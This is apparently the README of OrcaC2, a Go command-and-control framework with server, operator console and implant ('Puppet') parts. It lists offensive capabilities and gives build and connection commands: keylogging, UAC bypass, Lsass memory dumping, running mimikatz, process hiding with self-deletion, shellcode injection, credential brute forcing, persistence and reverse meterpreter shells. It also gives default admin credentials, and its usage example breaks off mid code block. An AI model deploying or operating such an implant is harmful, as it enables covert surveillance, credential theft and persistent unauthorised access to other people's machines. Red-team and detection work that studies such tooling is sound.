## Introduction

`OrcaC2` is a multifunctional Command & Control (C&C) framework based on encrypted WebSocket communication, implemented in Golang.

It consists of three parts: `Orca_Server` (Server), `Orca_Master` (Control), and `Orca_Puppet` (Client).

## Features & Functions

- WebSocket communication with data transmitted in JSON format; messages and data are encrypted with AES-CBC and encoded with Base64
- Remote command control (includes a command memo feature for quickly selecting long commands)
- File upload/download
- Screenshot capture (for Windows clients)
- Remote screen control (based on screenshot stream, allowing keyboard and mouse control) (for Windows clients)
- Keylogging
- Query basic information of the client and host (can locate the geographical region of the external IP using a pure IP database)
- Process enumeration/termination
- Interactive terminal (for Linux clients)
- Hidden processes (the process name can appear as any process in the list when using the `ps` command, and can also delete its own program) (for Linux clients)
- Bypass UAC and obtain administrator privileges (for Windows clients)
- CLR memory loading of .NET assemblies (for Windows clients)
- Remote PowerShell module loading (for Windows clients)
- Remote Shellcode and PE loading (supported injection methods: CreateThread, CreateRemoteThread, RtlCreateUserThread, EtwpCreateEtwThread) (for Windows clients)
- Forward/reverse proxy, socks5 forward/reverse proxy (supported protocols: tcp, rudp (reliable udp), ricmp (reliable icmp), rhttp (reliable http), kcp, quic)
- Multi-threaded port scanning (fingerprinting port information)
- Multi-threaded port brute force (supports ftp, ssh, wmi, wmihash, smb, mssql, oracle, mysql, rdp, postgres, redis, memcached, mongodb, snmp)
- Remote SSH command execution/file upload/download/SSH tunneling
- Remote SMB command execution (no output)/file upload (commands executed via RPC service, similar to wmiexec; files uploaded via ipc$, similar to psexec)
- Extract Lsass.dmp using the MiniDumpWriteDump API (for Windows clients)
- Execute mimikatz, fscan via CreateProcessWithPipe (for Windows clients); execute fscan via memfd (for Linux clients)
- Persistence (scheduled tasks, registry startup items, services) (for Windows clients)
- Reverse meterpreter shell

## Installation

> Before compiling the source code, you need to install: Go (>=1.18), gcc 

### Compile on Windows

After downloading and extracting the source package, simply run the `install.bat` file.

### Compile on Linux

```bash
$ git clone https://github.com/Ptkatz/OrcaC2.git
$ cd OrcaC2
$ chmod +x install.sh
$ ./install.sh
```

> If `install.sh` fails, execute the commands in the script one by one.

## Usage

### Orca_Server

Run the server by double-clicking it, provided that the configuration file (`./conf/app.ini`) and database files (`./db/team.db`, `./qqwry.dat`) are present.

Parameters:

- `-c`:     Specify the path to the configuration file
- `-au`:    Add a user
- `-du`:    Delete a user
- `-mu`:    Modify a user‚Äôs password

### Orca_Puppet

```bash
Orca_Puppet.exe -host <Server IP:Port> -debug -hide
```

Parameters:

- `-host`:     Address to connect to the server, default is `127.0.0.1:6000`
- `-debug`:    Enable debug information, default is `false`
- `-hide`:     In Linux, can disguise the process name and delete its own program file

> The Puppet client can be generated on the Master side using the `generate/build` command.

### Orca_Master

```bash
Orca_Master.exe -u <username> -p <password> -H <Server IP:Port>
```

Parameters:

- `-u` | `--username`:     Username to connect to the server
- `-p` | `--password`:     Password to connect to the server
- `-H` | `--host`:    Address to connect to the server, default is `127.0.0.1:6000`
- `-c` | `--color`:    Color of the logo and command prompt

> The default username and password in the server database are `admin:123456`.

Connection successful example:

```bash
C:\Users\blood\Desktop\OrcaC2\out\master>Orca_Master_win_x64.exe -u admin -p 123456

## Known Bugs

- Errors may occur when using the `assembly invoke` feature with certain C# programs; always test first in a work environment.
- When connecting with the SMB command execution (`smb exec`), screenshot and screen control functions cannot be used.
- In Linux, using hidden execution (`-hide`) may cause the program to crash when invoking the `pty` feature.
- When running the Puppet client with the SSH feature, invoking the `pty` feature may cause the program to crash.
